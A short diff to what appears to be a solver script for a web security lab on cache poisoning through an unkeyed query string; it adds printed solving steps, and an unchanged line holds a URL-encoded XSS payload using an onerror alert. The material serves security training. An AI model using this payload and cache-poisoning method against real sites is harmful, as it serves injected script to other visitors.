@@ -8,6 +8,9 @@ LAB_NAME = "Web cache poisoning via an unkeyed query string"
 
 
 def run(url, payload=None, proxies=None):
+    print(Fore.YELLOW + f"Steps to solve the lab:")
+    print(Fore.WHITE + f"""1. Inject payload as a query string\n2. Send multiple request to the main page to cache it with the injected payload\n""")
+
     url = url.rstrip('/')
 
     payload = """'><img src%3d1 onerror%3dalert(1)>"""
